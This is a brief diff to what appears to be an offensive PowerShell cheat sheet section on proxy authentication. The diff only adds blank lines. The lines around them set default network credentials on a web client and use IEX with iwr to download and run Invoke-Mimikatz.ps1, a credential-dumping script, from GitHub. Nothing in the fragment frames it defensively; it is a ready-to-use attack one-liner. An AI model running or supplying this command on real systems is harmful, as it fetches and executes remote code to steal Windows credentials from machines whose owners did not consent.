@@ -5,7 +5,9 @@
 ### powershell proxy authentication
 
 `$Client = New-Object -TypeName System.Net.WebClient`
+
 `$Client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials`
+
 `IEX (iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
 
 
